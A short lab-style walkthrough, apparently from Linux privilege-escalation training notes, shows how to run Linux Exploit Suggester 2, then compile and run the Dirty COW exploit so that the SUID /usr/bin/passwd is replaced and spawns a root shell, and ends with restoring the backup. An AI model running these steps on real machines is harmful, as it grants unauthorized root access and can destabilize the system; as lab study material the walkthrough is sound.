## Kernel Exploits
​
Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
​
Run the **Linux Exploit Suggester 2** tool to identify potential kernel exploits on the current system:
​

>[!Tip] Chebra
>```
>perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
>```

​
The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at **/home/user/tools/kernel-exploits/dirtycow/c0w.c**. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
​
Compile the code and run it (note that it may take several minutes to complete):
​

>[!Tip] Chebra
>```
>gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
>```
>```
>./c0w
>```

​
Once the exploit completes, run /usr/bin/passwd to gain a root shell:
​

>[!Tip] Chebra
>```
>/usr/bin/passwd
>```

​
Optional if you want to reverse your intrussion: Remember to restore the original **/usr/bin/passwd** file and exit the root shell.
​

>[!Tip] Chebra
>```
>mv /tmp/bak /usr/bin/passwd
>```
>```
>exit
>```